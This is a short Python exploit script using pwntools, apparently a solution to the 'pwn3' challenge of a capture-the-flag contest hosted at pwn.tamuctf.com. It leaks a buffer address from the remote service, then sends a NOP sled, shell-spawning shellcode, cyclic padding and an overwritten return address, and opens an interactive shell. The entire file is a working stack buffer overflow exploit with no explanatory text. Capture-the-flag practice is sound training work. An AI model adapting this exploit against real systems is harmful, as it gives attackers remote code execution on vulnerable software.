from __future__ import print_function
from pwn import *

################################################################
log.info("Starting")
# r = process('./pwn3')
r = remote('pwn.tamuctf.com', 4323)

################################################################
# Take this, you might need it on your journey 0xffd3934e!
log.info("Leaking buffer")
r.recvuntil('journey ')

addr = r.recvuntil('!')
addr = int(addr.replace('!', ''), 16)

log.info('Found address: {}'.format(hex(addr)))

################################################################
log.info("Preparing shellcode")

nop_sled = '\x90' * 20
shellcode = asm(shellcraft.sh())
padding_len = cyclic_find(0x61626461) - len(shellcode) - len(nop_sled)
padding = cyclic(padding_len)

payload = nop_sled
payload += shellcode
payload += padding
payload += p32(addr)

payload += 'A' * (400 - len(payload))

################################################################
log.info("Sending shellcode")
r.sendline(payload)
r.interactive()
